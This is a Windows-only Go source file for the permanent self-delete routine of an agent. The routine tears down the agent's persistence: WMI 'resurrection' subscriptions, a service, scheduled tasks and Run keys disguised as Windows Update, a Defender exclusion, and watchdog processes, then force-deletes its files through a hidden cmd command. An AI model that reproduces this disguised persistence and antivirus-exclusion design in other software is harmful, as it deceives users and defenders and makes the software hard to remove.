//go:build windows

package main

import (
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/shirou/gopsutil/v3/process"
	"golang.org/x/sys/windows/registry"
)

// Token-guarded permanent self-delete (v1.44). kill-agent only quiets the
// process; this removes every persistence layer in dependency order so no
// survivor resurrects mid-teardown, then deletes the binaries and exits.

var deleteTasks = []string{
	"WindowsUpdate",
	"WindowsUpdateWatchdog",
	"WindowsUpdateOrchestrator",
	"WindowsUpdateCheck",
}

var deleteRunValues = []string{
	"WindowsUpdate",
	"WindowsUpdateWatchdog",
	"WindowsUpdateCheck",
}

// isElevated reports whether we can modify HKLM (tasks/services/WMI/vault
// all need it). Self-delete refuses to run half-elevated: an unelevated
// agent stages delete_pending.json for the elevated watcher/WMI instead.
func isElevated() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

func deletePendingPath() string {
	exe, err := os.Executable()
	if err != nil {
		return filepath.Join(os.TempDir(), "delete_pending.json")
	}
	return filepath.Join(filepath.Dir(exe), "delete_pending.json")
}

// runSelfDelete executes teardown after a grace period for the goodbye
// output to flush. Elevated: wipe now. Otherwise: stage the pending flag
// and exit — the elevated watcher/WMI/service honors it on its next run.
func runSelfDelete() {
	time.Sleep(1500 * time.Millisecond)
	if !isElevated() {
		_ = os.WriteFile(deletePendingPath(), []byte("pending\n"), 0600)
		log.Printf("[*] self-delete staged for elevated teardown, exiting")
		os.Exit(0)
	}
	executeTeardown()
	os.Exit(0)
}

// claimDeletePending atomically claims a staged teardown so exactly one
// executor runs it. Returns true when this caller owns the teardown.
func claimDeletePending() bool {
	pend := deletePendingPath()
	active := pend + ".active"
	if _, err := os.Stat(pend); err != nil {
		return false
	}
	if err := os.Rename(pend, active); err != nil {
		return false // another executor claimed it
	}
	return true
}

// killSiblings terminates all agent/watcher processes except ourselves
// (the watcher image is identical, so it must die or it restores all).
func killSiblings() {
	pids, err := process.Pids()
	if err != nil {
		return
	}
	for _, pid := range pids {
		if p, err := process.NewProcess(pid); err == nil {
			if isAgentProc(p) {
				_ = p.Kill()
			}
		}
	}
	time.Sleep(2 * time.Second)
}

// removeWmiSets deletes both resurrection WMI sets (primary + bland).
func removeWmiSets() {
	for _, s := range wmiSets {
		na, nd, nc, tid := s[0], s[1], s[2], s[3]
		sb := `$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';` +
			`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Write-Host 'WMI-GONE'`
		out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb).CombinedOutput()
		if err != nil || !strings.Contains(string(out), "WMI-GONE") {
			log.Printf("[del] WMI set %s: %v %s", na, err, strings.TrimSpace(string(out)))
		}
	}
}

// executeTeardown removes every persistence layer in dependency order
// (resurrectors first), then the files, then sibling processes, then us.
// Must run elevated; best-effort per step, never aborts early.
func executeTeardown() {
	exe, _ := os.Executable()
	dir := ""
	if exe != "" {
		dir, _ = filepath.Abs(filepath.Dir(exe))
	}
	if dir == "" {
		dir, _ = os.Getwd()
	}
	log.Printf("[del] self-delete executing from %s", dir)
	removeWmiSets()
	_, _ = hiddenExec("sc", "stop", svcName).CombinedOutput()
	time.Sleep(time.Second)
	_, _ = hiddenExec("sc", "delete", svcName).CombinedOutput()
	for _, t := range deleteTasks {
		_, _ = hiddenExec("schtasks", "/delete", "/tn", t, "/f").CombinedOutput()
	}
	for _, root := range []registry.Key{registry.LOCAL_MACHINE, registry.CURRENT_USER} {
		if k, err := registry.OpenKey(root, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			for _, v := range deleteRunValues {
				_ = k.DeleteValue(v)
			}
			k.Close()
		}
	}
	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`)
	_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+strings.ReplaceAll(dir, "'", "''")+`' -ErrorAction SilentlyContinue`).CombinedOutput()
	// Data dirs (unlocked files). The running exes + locked files fall to
	// the delayed deleter below.
	w := loadWatchCfg()
	for _, d := range []string{w.backupDir, w.backupDir2, vaultDir(), w.legacyDir, w.legacyDirX86} {
		if d != "" {
			_ = os.RemoveAll(d)
		}
	}
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		_ = os.RemoveAll(filepath.Join(localApp, "RMM"))
	}
	_ = os.Remove(deletePendingPath())
	_ = os.Remove(deletePendingPath() + ".active")
	spawnDelayedDeleter(dir, exe)
	killSiblings()
	log.Printf("[del] teardown complete")
}

// spawnDelayedDeleter removes the running exes + dirs after we exit
// (Windows cannot delete a running exe). Hidden, detached, best effort.
func spawnDelayedDeleter(dir, exe string) {
	var args []string
	if exe != "" {
		args = append(args, `del /f /q "`+exe+`"`)
	}
	for _, d := range []string{dir, vaultDir()} {
		if d != "" {
			args = append(args, `rmdir /s /q "`+d+`"`)
		}
	}
	cmd := `ping -n 4 127.0.0.1>nul & ` + strings.Join(args, ` & `)
	c := hiddenExec("cmd.exe", "/c", cmd)
	_ = c.Start()
}
